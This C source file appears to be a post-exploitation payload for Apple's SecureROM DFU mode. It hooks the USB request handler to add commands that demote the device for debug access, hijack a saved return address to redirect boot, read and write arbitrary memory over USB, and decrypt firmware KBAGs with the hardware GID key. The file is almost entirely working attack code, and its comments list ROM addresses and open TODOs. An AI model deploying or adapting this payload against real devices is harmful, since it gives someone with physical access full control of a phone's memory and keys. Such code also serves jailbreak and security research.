#include <stdint.h>
#include <stdlib.h>
#include "offsets.h"

#define USB_DIRECTION_MASK  0x80
#define USB_DEVICE2HOST     0x80
#define USB_HOST2DEVICE     0x00

#define EP0_IN  0x80

struct usb_device_request {
    uint8_t  bmRequestType;
    uint8_t  bRequest;
    uint16_t wValue;
    uint16_t wIndex;
    uint16_t wLength;
} __attribute__((packed));

enum {
    DFU_DETACH = 0,
    DFU_DNLOAD,
    DFU_UPLOAD,
    DFU_GETSTATUS,
    DFU_CLR_STATUS,
    DFU_GETSTATE,
    DFU_ABORT,
    CUSTOM_DEMOTE,
    CUSTOM_BOOT,
    CUSTOM_AES_GID,
    CUSTOM_TEST,
    CUSTOM_READ,
    CUSTOM_WRITE
};

/*
 * AES engine interface for GID key KBAG decryption.
 *
 * TODO: These addresses must be determined per-SoC by reversing
 * the SecureROM AES functions. Use memory read primitive (below)
 * + SWD debug (after demote) to find the ROM's aes_crypto_cmd.
 *
 * GID key slot = 0x3E8, UID key slot = 0x7D0.
 * AES function found in iBoot 27.0 @ 0x870066FA4, string "gid-aes-key" @ 0x8701374A8.
 * NOTE: Siguza raised concern that SEP may disable AES seed bits before DFU — needs hw test.
 */

#if defined(AES_CRYPTO_CMD)
static int (*aes_crypto_cmd)(int op, void *src, void *dst, unsigned int len, unsigned int opts, void *iv, void *key) = (void *)AES_CRYPTO_CMD;
#define AES_DECRYPT     0x11
#define AES_GID_KEY     0x20000
#define KBAG_SIZE       48
#endif

static int  (*orig_handle_usb_req)(struct usb_device_request *request, uint8_t **io_buffer) = (void *)HANDLE_USB_REQ;
static void (*platform_demote)() = (void *)PLATFORM_DEMOTE;
static void (*platform_set_remote_boot)() = (void *)PLATFORM_SET_REMOTE_BOOT;

#if WITH_PAC

__attribute__((naked))
uint64_t PACIB(uint64_t ptr, uint64_t ctx) {
    asm("PACIB x0, x1");
    asm("RET");
}

#endif

/*
 * Protocol test magic — host sends CUSTOM_TEST, we return "usbliter8" (9 bytes).
 * If the host receives this, the custom handler is confirmed active.
 */
static const char test_magic[] = "usbliter8";

/*
 * Memory read buffer — wValue:wIndex encode the 32-bit address,
 * wLength is the number of bytes to read (max 2048 via EP0).
 *
 * Address encoding:
 *   Full 64-bit addr = ((uint64_t)wValue << 32) | ((uint64_t)wIndex << 16) | implicit_low
 *
 * Simplified scheme (covers 0x00000000-0xFFFFFFFF range per 64KB page):
 *   addr = (wValue << 16) | wIndex
 *   For addresses > 32-bit, use two transfers or the extended scheme.
 *
 * Extended scheme (full 48-bit):
 *   High transfer: CUSTOM_WRITE with wValue=0xFFFF sets high 16 bits
 *   Then CUSTOM_READ uses: addr = (saved_high << 32) | (wValue << 16) | wIndex
 */
static uint16_t addr_high = 0;

static uint8_t rw_buf[2048];

int custom_handle_usb_req(struct usb_device_request *request, uint8_t **io_buffer) {
    uint8_t bmRequestType = request->bmRequestType;
    uint8_t bRequest      = request->bRequest;
    uint16_t wValue       = request->wValue;
    uint16_t wIndex       = request->wIndex;
    uint16_t wLength      = request->wLength;

    if ((bmRequestType & USB_DIRECTION_MASK) == USB_HOST2DEVICE) {
        switch (bRequest) {
            case CUSTOM_DEMOTE: {
                platform_demote();
                return 0;
            }

            case CUSTOM_BOOT: {
                platform_set_remote_boot();

                uint64_t ptr = -1;
#if WITH_PAC
                ptr = PACIB(JUMP_AWAY, MAIN_TASK_STACK_LR + 8);
#else
                ptr = JUMP_AWAY;
#endif

                *(volatile uint64_t *)MAIN_TASK_STACK_LR = ptr;
                return 0;
            }

            case CUSTOM_WRITE: {
                if (wValue == 0xFFFF && wIndex == 0xFFFF) {
                    /* Set high 16 bits of address for extended addressing */
                    uint8_t *src = *io_buffer;
                    if (wLength >= 2)
                        addr_high = (uint16_t)(src[0] | (src[1] << 8));
                    return 0;
                }

                /* Memory write: addr = (addr_high << 32) | (wValue << 16) | wIndex */
                uint64_t addr = ((uint64_t)addr_high << 32) | ((uint64_t)wValue << 16) | wIndex;
                volatile uint8_t *dst = (volatile uint8_t *)addr;
                uint8_t *src = *io_buffer;
                uint16_t len = (wLength > 2048) ? 2048 : wLength;

                for (uint16_t i = 0; i < len; i++)
                    dst[i] = src[i];

                return 0;
            }
        }

    } else if ((bmRequestType & USB_DIRECTION_MASK) == USB_DEVICE2HOST) {

        if (bRequest == CUSTOM_TEST) {
            for (int i = 0; i < (int)sizeof(test_magic); i++)
                rw_buf[i] = test_magic[i];
            *io_buffer = rw_buf;
            return sizeof(test_magic);
        }

        if (bRequest == CUSTOM_READ) {
            /* Memory read: addr = (addr_high << 32) | (wValue << 16) | wIndex */
            uint64_t addr = ((uint64_t)addr_high << 32) | ((uint64_t)wValue << 16) | wIndex;
            volatile uint8_t *src = (volatile uint8_t *)addr;
            uint16_t len = (wLength > 2048) ? 2048 : wLength;

            for (uint16_t i = 0; i < len; i++)
                rw_buf[i] = src[i];

            *io_buffer = rw_buf;
            return len;
        }

#if defined(AES_CRYPTO_CMD)
        if (bRequest == CUSTOM_AES_GID) {
            static uint8_t kbag_buf[KBAG_SIZE];
            uint8_t *src = *io_buffer;

            for (int i = 0; i < KBAG_SIZE; i++)
                kbag_buf[i] = src[i];

            aes_crypto_cmd(AES_DECRYPT, kbag_buf, kbag_buf, KBAG_SIZE, AES_GID_KEY, NULL, NULL);

            *io_buffer = kbag_buf;
            return KBAG_SIZE;
        }
#endif
    }

    return orig_handle_usb_req(request, io_buffer);
}